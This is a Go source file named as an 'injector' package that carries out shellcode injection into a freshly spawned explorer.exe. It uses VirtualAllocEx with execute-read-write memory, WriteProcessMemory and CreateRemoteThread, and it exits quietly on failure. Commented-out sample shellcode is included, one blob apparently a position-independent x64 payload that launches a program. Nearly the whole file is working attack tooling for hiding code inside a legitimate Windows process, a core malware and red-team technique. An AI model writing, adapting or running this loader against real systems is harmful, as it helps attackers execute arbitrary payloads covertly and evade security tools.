package injector

import (
    "syscall" // https://go.dev/src/syscall/syscall_windows.go
    "unsafe"
    "time"
    "golang.org/x/sys/windows"
    "fmt"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    TARGET_APP             = "C:\\Windows\\explorer.exe"
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    // ntdll         = syscall.MustLoadDLL("ntdll.dll")

    CreateProcess = kernel32.MustFindProc("CreateProcessW")
    VirtualAllocEx  = kernel32.MustFindProc("VirtualAllocEx")
    WriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
    CreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
)

func shellcodeLoad(shellcode []byte) {

    //shellcode := [] byte ("\x90\x90\x90\x90\xcc\xcc\xcc\xcc")
    // shellcode := []byte ("\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"+
    // "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"+
    // "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"+
    // "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"+
    // "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"+
    // "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"+
    // "\x48\x83\xec\x20\x41\xff\xd6")

    // 1. Create the process to inject.
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    _, _, err := CreateProcess.Call(
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(TARGET_APP))),                 // [in, optional]      LPCSTR                lpApplicationName,
        0,                          // [in, out, optional] LPSTR                 lpCommandLine,
        0,                          // [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        0,                          // [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        1,                          // [in]                BOOL                  bInheritHandles,
        0,                          // [in]                DWORD                 dwCreationFlags,
        0,                          // [in, optional]      LPVOID                lpEnvironment,
        0,                          // [in, optional]      LPCSTR                lpCurrentDirectory,
        uintptr(unsafe.Pointer(&si)), // [in]                LPSTARTUPINFOA        lpStartupInfo,
        uintptr(unsafe.Pointer(&pi)), // [out]               LPPROCESS_INFORMATION lpProcessInformation        
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        //fmt.Println(err.Error())
        //fmt.Println(pi)
        syscall.Exit(0)
    }
    fmt.Println(pi)


    //   LPVOID VirtualAllocEx(
    // [in]           HANDLE hProcess,
    // [in, optional] LPVOID lpAddress,
    // [in]           SIZE_T dwSize,
    // [in]           DWORD  flAllocationType,
    // [in]           DWORD  flProtect
    //   );
    addr, _, err := VirtualAllocEx.Call(
        uintptr(unsafe.Pointer(pi.Process)),
        0, 
        uintptr(len(shellcode)), 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        syscall.Exit(0)
    }

    fmt.Printf("Allocated address: 0x%x\n", addr)

    /*

    BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
    */

    var bytesWritten uint
    _, _, err = WriteProcessMemory.Call(
        uintptr(unsafe.Pointer(pi.Process)),
        uintptr(addr), // uintptr(0x6000), i understand that it will make 0x6000 to be seen as an address to uints
        (uintptr)(unsafe.Pointer(&shellcode[0])), 
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        syscall.Exit(0)
    }

    fmt.Println("Finished writing shellcode")

    // // jump to shellcode
    // HANDLE CreateRemoteThread(
    //   [in]  HANDLE                 hProcess,
    //   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    //   [in]  SIZE_T                 dwStackSize,
    //   [in]  LPTHREAD_START_ROUTINE lpStartAddress,
    //   [in]  LPVOID                 lpParameter,
    //   [in]  DWORD                  dwCreationFlags,
    //   [out] LPDWORD                lpThreadId
    // );

    _, _, err = CreateRemoteThread.Call(
        uintptr(unsafe.Pointer(pi.Process)),
        0,
        0,
        uintptr(addr),
        0,
        0,
        0,
    )


    if err != nil && err.Error() != "The operation completed successfully." {
        syscall.Exit(0)
    }

    fmt.Println("Thread on Injected code started.")

    time.Sleep(1*time.Second)
}